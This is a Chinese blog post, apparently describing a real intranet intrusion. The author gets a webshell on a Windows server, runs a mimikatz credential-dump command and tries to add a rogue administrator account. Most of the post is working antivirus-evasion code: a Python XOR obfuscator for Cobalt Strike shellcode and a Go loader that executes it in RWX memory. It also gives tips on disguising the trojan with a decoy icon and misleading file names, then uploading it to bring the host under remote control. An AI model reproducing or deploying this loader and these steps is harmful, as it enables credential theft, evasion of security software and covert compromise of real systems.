<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x01前言昨夜我做了一个长长的梦，梦里我很思念她，她亦很思念我. . . . . . 0x02背景最近在学习内网，温故而知新，所以抽空总结了一下现有的知识，既是分享，也是审视。 0x03上传文件通过一个已知漏洞获取到webshell权限，是一台win server服务器 administrator权限。 上传mimikatz尝试获取hash 1mimikatz.exe &quot;privile">
<meta property="og:type" content="article">
<meta property="og:title" content="实战|记一次内网渗透">
<meta property="og:url" content="https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/index.html">
<meta property="og:site_name" content="m2">
<meta property="og:description" content="0x01前言昨夜我做了一个长长的梦，梦里我很思念她，她亦很思念我. . . . . . 0x02背景最近在学习内网，温故而知新，所以抽空总结了一下现有的知识，既是分享，也是审视。 0x03上传文件通过一个已知漏洞获取到webshell权限，是一台win server服务器 administrator权限。 上传mimikatz尝试获取hash 1mimikatz.exe &quot;privile">
<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
<meta property="article:published_time" content="2021-12-07T02:53:42.000Z">
<meta property="article:modified_time" content="2021-12-07T02:38:54.587Z">
<meta property="article:author" content="作者">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>实战|记一次内网渗透</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2020/09/11/vulnhub-drupal/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&text=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&is_video=false&description=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=实战|记一次内网渗透&body=Check out this article: https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&name=实战|记一次内网渗透&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&t=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01前言"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02背景"><span class="toc-number">2.</span> <span class="toc-text">0x02背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03上传文件"><span class="toc-number">3.</span> <span class="toc-text">0x03上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04木马免杀"><span class="toc-number">4.</span> <span class="toc-text">0x04木马免杀</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        实战|记一次内网渗透
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">m2</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-12-07T02:53:42.000Z" itemprop="datePublished">2021-12-07</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>昨夜我做了一个长长的梦，梦里我很思念她，她亦很思念我. . . . . .</p>
<h2 id="0x02背景"><a href="#0x02背景" class="headerlink" title="0x02背景"></a>0x02背景</h2><p>最近在学习内网，温故而知新，所以抽空总结了一下现有的知识，既是分享，也是审视。</p>
<h2 id="0x03上传文件"><a href="#0x03上传文件" class="headerlink" title="0x03上传文件"></a>0x03上传文件</h2><p>通过一个已知漏洞获取到webshell权限，是一台win server服务器 administrator权限。<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png" alt="1"></p>
<p>上传mimikatz尝试获取hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png" alt="2"><br>执行完直接被删了，procdump也一样</p>
<p>看了一下防火墙和tasklist</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure>
<p>防火墙开了还有杀软<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png" alt="3"><br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png" alt="4"><br>看了下net user能用</p>
<p>3个思路<br>1、创建一个新的管理员账号，连3389进去进行下一步操作<br>2、上传一个cs免杀马上线cs操作<br>3、使用administrator账户关闭杀软和防火墙</p>
<p><strong>添加账户</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user planet planet@m2 &#x2F;add</span><br></pre></td></tr></table></figure>
<p>显示拒绝访问，应该是被杀软规则拦截了<br>尝试绕过杀软用windowsapi创建管理员用户<br>脚本地址：<a href="https://github.com/cckuailong/netuser" target="_blank" rel="noopener">https://github.com/cckuailong/netuser</a><br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png" alt="5"></p>
<p>执行过后虽然没有提示失败但是查看用户发现没有添加上</p>
<p>此时还可以尝试关闭杀软添加，但是此举动静过大，不到万不得已我不愿意用此方法<br>使用第二种方法，制作免杀木马上线cs</p>
<h2 id="0x04木马免杀"><a href="#0x04木马免杀" class="headerlink" title="0x04木马免杀"></a>0x04木马免杀</h2><p>免杀方式：使用xor编辑c-shellcode然后用go解密执行</p>
<p><strong>第一步：</strong><br>把cs生成的c-shellcode填入xor的shellcode字段中<br>xor.py内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">def xor(shellcode, key):</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    key_len &#x3D; len(key)</span><br><span class="line">    # 对shellcode的每一位进行xor亦或处理</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        s &#x3D; ord(shellcode[i])</span><br><span class="line">        p &#x3D; ord((key[i % key_len]))</span><br><span class="line">        s &#x3D; s ^ p  # 与p异或，p就是key中的字符之一</span><br><span class="line">        s &#x3D; chr(s)</span><br><span class="line">        new_shellcode +&#x3D; s</span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def random_decode(shellcode):</span><br><span class="line">    j &#x3D; 0</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(0,len(shellcode)):</span><br><span class="line">        if i % 2 &#x3D;&#x3D; 0:</span><br><span class="line">            new_shellcode[i] &#x3D; shellcode[j]</span><br><span class="line">            j +&#x3D; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_random_code(shellcode, key):</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    key_len &#x3D; len(key)</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        new_shellcode +&#x3D; shellcode[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        new_shellcode +&#x3D; key[i % key_len]</span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def str_to_hex(shellcode):</span><br><span class="line">    raw &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        s &#x3D; hex(ord(shellcode[i])).replace(&quot;0x&quot;,&#39;,0x&#39;)</span><br><span class="line">        raw &#x3D; raw + s</span><br><span class="line">    return raw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    shellcode&#x3D;&quot;\xfc\x48\x83\...&quot;</span><br><span class="line">    #这是异或和增加随机字符使用的key</span><br><span class="line">    key &#x3D; &quot;planet&quot;</span><br><span class="line">    shellcode &#x3D; xor(shellcode, key)</span><br><span class="line">    shellcode &#x3D; add_random_code(shellcode, key)</span><br><span class="line">    print(str_to_hex(shellcode))</span><br></pre></td></tr></table></figure>
<p>执行xor.py<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png" alt="6"><br><strong>第二步</strong><br>把上一步生成的shellcode填到shell.go的shellcode字段中，记得两个文件key要一致。<br>shell.go内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">  &quot;syscall&quot;</span><br><span class="line">  &quot;time&quot;</span><br><span class="line">  &quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">  MEM_COMMIT             &#x3D; 0x1000</span><br><span class="line">  MEM_RESERVE            &#x3D; 0x2000</span><br><span class="line">  PAGE_EXECUTE_READWRITE &#x3D; 0x40 &#x2F;&#x2F; 区域可以执行代码，应用程序可以读写该区域。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">  kernel32      &#x3D; syscall.MustLoadDLL(&quot;kernel32.dll&quot;)</span><br><span class="line">  ntdll         &#x3D; syscall.MustLoadDLL(&quot;ntdll.dll&quot;)</span><br><span class="line">  VirtualAlloc  &#x3D; kernel32.MustFindProc(&quot;VirtualAlloc&quot;)</span><br><span class="line">  RtlCopyMemory &#x3D; ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  mix_shellcode :&#x3D; []byte&#123;0x8c,0x70,...&#125;</span><br><span class="line">  var ttyolller []byte</span><br><span class="line">  key :&#x3D; []byte(&quot;planet&quot;)#xor.py中的key</span><br><span class="line">  var key_size &#x3D; len(key)</span><br><span class="line">  var shellcode_final []byte</span><br><span class="line">  var j &#x3D; 0</span><br><span class="line">  time.Sleep(2)</span><br><span class="line">  &#x2F;&#x2F;fmt.Print(len(mix_shellcode))</span><br><span class="line">  for i :&#x3D; 0; i &lt; len(mix_shellcode); i++ &#123;</span><br><span class="line">    if i%2 &#x3D;&#x3D; 0 &#123;</span><br><span class="line">      shellcode_final &#x3D; append(shellcode_final, mix_shellcode[i])</span><br><span class="line">      j +&#x3D; 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  &#x2F;&#x2F;fmt.Print(shellcode_final)</span><br><span class="line">  &#x2F;&#x2F; 解密异或</span><br><span class="line">  for i :&#x3D; 0; i &lt; len(shellcode_final); i++ &#123;</span><br><span class="line">    ttyolller &#x3D; append(ttyolller, shellcode_final[i]^key[i%key_size])</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  addr, _, err :&#x3D; VirtualAlloc.Call(0, uintptr(len(ttyolller)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">  if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">    syscall.Exit(0)</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  _, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;ttyolller[0])), uintptr(len(ttyolller)))</span><br><span class="line">  if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">    syscall.Exit(0)</span><br><span class="line">  &#125;</span><br><span class="line">  syscall.Syscall(addr, 0, 0, 0, 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行go build -ldflags=”-H windowsgui -w -s” shell.go生成shell.exe<br>此时基本已经完成了，但是这个默认的图标太扎眼容易引起怀疑</p>
<p>把shell.exe拖到Restorator右键添加资源，类型选择图标，名称随便起一个<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png" alt="7"><br>然后在test处右键导入ico文件即可<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/xss/xss1.png" alt="8"><br>木马改个有迷惑性的名字如printapi、find5tr、he1p等</p>
<p>用冰蝎上传到目标机，执行上线</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01前言"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02背景"><span class="toc-number">2.</span> <span class="toc-text">0x02背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03上传文件"><span class="toc-number">3.</span> <span class="toc-text">0x03上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04木马免杀"><span class="toc-number">4.</span> <span class="toc-text">0x04木马免杀</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&text=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&is_video=false&description=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=实战|记一次内网渗透&body=Check out this article: https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&name=实战|记一次内网渗透&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2021/12/07/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&t=实战|记一次内网渗透" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2021
    作者
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
